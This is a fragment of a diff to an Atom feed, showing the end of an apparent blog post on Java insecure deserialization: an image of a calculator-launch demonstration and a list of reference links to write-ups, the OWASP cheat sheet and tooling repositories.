+</span></code></pre></td></tr></table></div></figure></p>
+
+<p><img src="/artifacts/insecure_deserialization_java.assets/calc_rce.png" alt="" /></p>
+
+<h2>References</h2>
+
+<ul>
+<li><a href="https://speakerdeck.com/dhavalkapil/magichat-insomnihack-teaser-2018-writeup">https://speakerdeck.com/dhavalkapil/magichat-insomnihack-teaser-2018-writeup</a></li>
+<li><a href="https://www.youtube.com/watch?v=t-zVC-CxYjw&amp;t=1206s">https://www.youtube.com/watch?v=t-zVC-CxYjw&amp;t=1206s</a></li>
+<li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html">https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html</a></li>
+<li><a href="https://github.com/JackOfMostTrades/gadgetinspector">https://github.com/JackOfMostTrades/gadgetinspector</a></li>
+<li><a href="https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections1.java">https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections1.java</a></li>
+</ul>
+
+]]></content>
+  </entry>
+  
+</feed>
